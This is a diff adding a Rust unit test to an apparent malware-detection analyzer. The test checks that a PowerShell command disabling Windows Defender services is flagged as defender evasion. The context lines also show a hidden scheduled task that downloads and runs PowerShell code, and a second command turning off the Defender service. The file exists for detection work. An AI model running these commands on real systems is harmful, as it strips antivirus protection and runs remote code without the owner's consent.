@@ -2877,6 +2877,25 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_set_service_name_list_disabled_emits_each_defender_evasion_trait() {
+        let script =
+            br#"powershell -Command "Set-Service -Name WinDefend, WdNisSvc -StartupType Disabled""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for service in ["WinDefend", "WdNisSvc"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion { action, target }
+                        if action == "powershell-service-disabled" && target == service
+                )),
+                "PowerShell Set-Service disabled service {service} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn powershell_set_service_defender_displayname_disabled_emits_trait() {
         let script = br#"powershell -Command "Set-Service -DisplayName 'Windows Defender Antivirus Service' -StartupType Disabled""#;
         let report = analyze(script, &AnalyzeConfig::default());
